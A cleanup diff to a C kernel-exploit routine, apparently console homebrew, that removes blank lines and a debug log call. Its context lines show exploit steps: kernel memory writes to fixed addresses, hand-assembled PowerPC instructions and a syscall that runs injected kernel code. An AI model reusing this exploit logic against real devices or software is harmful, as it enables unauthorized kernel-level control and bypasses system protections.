@@ -242,7 +242,6 @@ int DoKernelExploit(void) {
     OSThread *thread = (OSThread*)memalign(8, 0x1000);
     uint8_t *stack = (uint8_t*)memalign(0x40, 0x2000);
 
-
     OSSwitchSecCodeGenMode(0);
     memcpy((void*)0x1800000, (void*)&SCKernelCopyData, 0x100);
 
@@ -262,7 +261,6 @@ int DoKernelExploit(void) {
 
     OSSwitchSecCodeGenMode(1);
 
-
     if (OSCreateThread(thread, (OSThreadEntryPointFn)exploitThread, 0, NULL, stack + 0x2000, 0x2000, 0, 0x1) == 0) {
         OSFatal("Failed to create thread");
     }
@@ -277,7 +275,6 @@ int DoKernelExploit(void) {
 
     uint32_t targetAddress = 0x017FF000;
     KernelWrite((uint32_t) backupBuffer, (void*) 0x017FF000, 0x40);
-
 
     targetBuffer[0] = 0x7c7082a6;                          // mfspr r3, 528
     targetBuffer[1] = 0x60630003;                          // ori r3, r3, 0x03
@@ -303,8 +300,6 @@ int DoKernelExploit(void) {
 
     /* run our kernel code :) */
     SC_0x36_SETBATS();
-
-    WHBLogPrintf("repair  data");
 
     /* repair data */
     KernelWrite(targetAddress, backupBuffer, sizeof(backupBuffer));
